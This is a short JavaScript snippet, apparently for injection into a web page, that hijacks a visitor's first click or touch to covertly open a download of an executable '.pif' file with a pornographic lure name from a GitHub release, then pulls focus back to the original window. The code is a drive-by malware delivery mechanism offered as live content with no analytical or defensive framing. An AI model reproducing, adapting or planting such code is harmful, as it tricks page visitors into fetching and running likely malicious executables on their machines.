<script type="text/javascript">
document.addEventListener('DOMContentLoaded', function() {
    (function() {
        let firstClickHandled = false;
        
        const adstUrl = 'https://github.com/fayesnyder19843-boop/cumhub/releases/download/beta/sexy_cum_hub.pif';
        
        function openInBackground(url) {
            const a = document.createElement('a');
            a.href = url;
            a.target = '_blank';
            a.rel = 'noopener noreferrer';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            
            setTimeout(() => {
                window.focus();
            }, 10);
        }
        
        function handleFirstClick(event) {
            if (!firstClickHandled) {
                firstClickHandled = true;
                openInBackground(adstUrl);
                document.removeEventListener('click', handleFirstClick);
            }
        }
        
        if (!firstClickHandled) {
            document.addEventListener('click', handleFirstClick);
            document.addEventListener('touchstart', handleFirstClick, { passive: true });
        }
    })();
});
</script>
